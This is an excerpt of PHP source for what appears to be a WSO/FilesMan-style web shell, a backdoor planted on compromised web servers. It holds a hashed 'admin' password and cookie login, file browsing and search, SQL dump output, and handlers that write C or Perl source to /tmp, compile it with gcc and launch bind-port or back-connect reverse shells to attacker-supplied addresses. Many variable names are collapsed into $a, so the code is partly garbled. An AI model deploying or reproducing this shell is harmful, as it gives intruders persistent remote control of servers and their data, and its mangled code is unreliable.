...
//-----------------Password---------------------
$a = "21232f297a57a5a743894a0e4a801fc3"; //admin
$a = true;
$a = 'UTF-8';
$a = 'FilesMan';
$a = md5($_SERVER['HTTP_USER_AGENT']);
if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
prototype(md5($_SERVER['HTTP_HOST'])."key", $a);
}
...
return ($a==''?" Query did not return anything\n":$a);
}
function viewSize($s) {
if($s >= 1073741824)
...
if(empty($_POST['p2']) || @strpos(file_get_contents($a), $_POST['p2'])!==false)
echo "<a href='#' onclick='g(\"FilesTools\",null,\"".urlencode($a)."\", \"view\",\"\")'>".htmlspecialchars($a)."</a><br>";
}
}
}
}
...
$columns[] = $k;
                        ...
                        $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $a).');'."\n";
                        if($fp) fwrite($fp, $sql); else echo($sql);
}
break;
}
...
$a = ex("gcc -o /tmp/bp /tmp/bp.c");
@unlink("/tmp/bp.c");
$a .= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &");
echo "<pre class=ml1>$".ex("ps aux | grep bp")."</pre>";
}
if($_POST['p1'] == 'bpp') {
cf("/tmp/bp.pl",$bind_port_p);
$a = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &");
echo "<pre class=ml1>$".ex("ps aux | grep bp.pl")."</pre>";
}
if($_POST['p1'] == 'bcc') {
cf("/tmp/bc.c",$back_connect_c);
$a = ex("gcc -o /tmp/bc /tmp/bc.c");
@unlink("/tmp/bc.c");
$a .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");
echo "<pre class=ml1>$".ex("ps aux | grep bc")."</pre>";
}
if($_POST['p1'] == 'bcp') {
cf("/tmp/bc.pl",$back_connect_p);
$a= ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &");
...
if( empty($_POST['a']) )
if(isset($a) && function_exists('action' . $a))
$_POST['a'] = $a;
else
$_POST['a'] = 'FilesMan';
